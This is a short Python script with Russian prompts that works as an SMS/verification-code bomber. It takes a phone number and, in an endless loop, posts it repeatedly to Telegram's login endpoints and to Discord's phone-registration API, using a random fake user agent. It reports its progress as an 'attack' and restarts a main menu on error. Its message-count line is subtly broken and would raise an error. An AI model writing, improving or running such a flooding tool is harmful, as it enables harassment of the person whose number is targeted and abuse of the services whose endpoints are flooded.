import requests
import fake_useragent
import colorama
import os
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
clear_console()
green = colorama.Fore.LIGHTGREEN_EX
cyan = colorama.Fore.CYAN
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = int(input(cyan + '[?] Введите номер телефона > '))
count = 9999
nomer = number

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        print(number)
        count += 1
        print(cyan + "[!] Происходит атака, всего отправлено " + {count} + " сообщений")
except Exception as e:
      input(cyan + "[!] Произошла ошибка, перепроверьте вводимые данные и нажмите ENTER для возврата в главное меню\n")
      clear_console()
      os.system("python main.py")